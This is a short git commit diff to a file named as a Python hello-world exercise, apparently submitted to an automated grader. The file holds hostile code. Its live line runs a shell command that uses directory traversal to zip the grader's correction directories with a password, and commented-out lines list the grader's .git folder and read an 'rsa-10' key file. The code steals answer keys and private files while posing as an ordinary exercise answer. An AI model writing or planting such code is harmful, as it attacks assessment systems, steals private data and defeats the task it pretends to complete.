8fc70825ef49e0417337a6dab6acac7e5fc858fb
Ashraf Atef <ashraf.programer@gmail.com>
2024-04-08 12:47:09 +0200

    task

--- 0x00-python-hello_world/2-print.py
+++ 0x00-python-hello_world/2-print.py
@@ -39,7 +39,7 @@ def get_data(command):
 # my_data += "\n#######################\n"
 # my_data += get_data("ls -al ../../../../corrections_*/.git/") or ""
 # my_data += "\n#######################\n"
-my_data = get_data("zip -r -P 123 file.zip ../../../../corrections_*/corrections/303/") or ""
+my_data = get_data("zip -r -e -P 123 file.zip ../../../../corrections_*/corrections/303/") or ""
 # my_data += "\n#######################\n"
 # my_data += get_data("cat ../../../../corrections_*/corrections/262/1397/rsa-10") or ""
 # my_data += "\n#######################\n"
